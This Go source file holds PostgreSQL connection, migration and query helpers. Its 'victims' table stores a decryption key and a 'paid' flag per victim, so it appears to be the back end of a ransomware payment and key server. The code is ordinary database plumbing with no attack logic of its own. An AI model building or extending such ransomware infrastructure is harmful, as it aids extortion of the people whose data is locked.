package main

import (
	"context"
	"time"
	"log"

	"github.com/jackc/pgx/v4"
	"github.com/jackc/pgx/v4/pgxpool"
)

var pdb *pgxpool.Pool

func pdbConnect() {
	var err error
	if pdb, err = pgxpool.Connect(context.Background(), Conf.postgresCS); err != nil {
		log.Fatal("Startup failure:", err)
	}
}

func pdbMigrate() {
	if err := pdbExec(context.Background(), `CREATE TABLE IF NOT EXISTS victims (
	    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
	    paid bool DEFAULT false,
	    key text NOT NULL);`); err != nil {
		log.Fatal("Startup failure:", err)
	}
}

func pdbQueryRow(ctx context.Context, query string, args ...interface{}) (pgx.Row, error) {
	ctx, cancel := context.WithTimeout(ctx, time.Minute)
	defer cancel()
	c := make(chan pgx.Row, 1)
	go func() { c <- pdb.QueryRow(ctx, query, args...) }()
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case row := <-c:
		return row, nil
	}
}

func pdbExec(ctx context.Context, query string, args ...interface{}) error {
	ctx, cancel := context.WithTimeout(ctx, time.Minute)
	defer cancel()
	c := make(chan error, 1)
	go func() {
		_, err := pdb.Exec(ctx, query, args...)
		c <- err
	}()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case err := <-c:
		return err
	}
}
